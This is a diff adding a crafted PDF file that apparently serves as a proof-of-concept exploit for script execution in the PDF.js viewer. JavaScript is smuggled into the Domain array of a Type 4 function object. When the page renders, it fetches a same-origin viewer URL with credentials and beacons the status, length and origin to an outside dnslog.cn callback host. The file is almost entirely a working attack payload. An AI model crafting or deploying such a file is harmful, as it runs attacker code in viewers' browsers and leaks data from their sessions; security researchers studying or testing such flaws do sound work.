@@ -1,0 +1,64 @@
+%PDF-1.7
+%‚„œ”
+
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>
+endobj
+
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842]
+   /Resources << /ColorSpace << /Pattern /Pattern >> /Pattern << /P1 4 0 R >> >>
+   /Contents 7 0 R
+>>
+endobj
+
+4 0 obj
+<< /Type /Pattern /PatternType 2 /Shading 5 0 R >>
+endobj
+
+5 0 obj
+<< /ShadingType 2 /ColorSpace /DeviceRGB /Coords [0 0 595 0]
+   /Domain [0 1] /Function 6 0 R /Extend [true true]
+>>
+endobj
+
+6 0 obj
+<< /FunctionType 4
+   /Domain [0 (1, src[srcOffset + 0]\)\);try{ \(function\(\){ var marker="PDFJS_15188_POC_1_2_3_EXECUTED"; var cb="https://test.l6sbd3.dnslog.cn/pdfjs15188"; var target="/igi/orion-platform/static/js/pdfjs/web/viewer.html"; function enc\(v\){try{return encodeURIComponent\(String\(v\)\);}catch\(e\){return "enc_error";}} function beacon\(q\){ try{ fetch\(cb+"?"+q,{mode:"no-cors",credentials:"omit",cache:"no-store"}\).catch\(function\(e\){ try{console.warn\(marker+"_BEACON_ASYNC_ERROR",e&&e.message\);}catch\(_\){} }\); }catch\(e\){ try{console.warn\(marker+"_BEACON_ERROR",e&&e.message\);}catch\(_\){} } } try{ var origin=\(typeof self!=="undefined"&&self.location&&\(self.location.origin||self.location.href\)\)||"worker"; var sameOriginUrl=\(origin&&origin!=="worker"?origin:""\)+target; console.warn\("\\u8fd9\\u662fjs\\u4efb\\u610f\\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e"\); console.warn\(marker+"_CONSOLE",origin\); fetch\(sameOriginUrl,{credentials:"include",cache:"no-store"}\).then\(function\(r\){ var status=r.status; var ct=""; try{ct=r.headers.get\("content-type"\)||"";}catch\(e\){} return r.text\(\).then\(function\(t\){ var len=t.length; console.warn\(marker+"_SAME_ORIGIN_FETCH_OK","url="+sameOriginUrl,"status="+status,"length="+len,"content-type="+ct\); beacon\("m="+enc\(marker\)+"&stage=ok&s="+enc\(status\)+"&l="+enc\(len\)+"&ct="+enc\(ct\)+"&o="+enc\(origin\)\); }\); }\).catch\(function\(e\){ var msg=e&&e.message||e; console.warn\(marker+"_SAME_ORIGIN_FETCH_ERROR",msg\); beacon\("m="+enc\(marker\)+"&stage=fetch_error&err="+enc\(msg\)\); }\); }catch\(e\){ console.warn\(marker+"_ERROR",e&&e.message\); beacon\("m="+enc\(marker\)+"&stage=top_error&err="+enc\(e&&e.message\)\); } }\)\(\) }catch\(e\){try{console.warn\("PDFJS_15188_TOP_ERROR",e&&e.message\)}catch\(_\){}}//)]
+   /Range [0 1 0 1 0 1]
+   /Length 11
+>>
+stream
+{ dup dup }
+endstream
+endobj
+
+7 0 obj
+<< /Length 37 >>
+stream
+/Pattern cs
+/P1 scn
+0 0 595 842 re
+f
+endstream
+endobj
+
+xref
+0 8
+0000000000 65535 f 
+0000000016 00000 n 
+0000000066 00000 n 
+0000000148 00000 n 
+0000000320 00000 n 
+0000000387 00000 n 
+0000000520 00000 n 
+0000002428 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+2515
+%%EOF
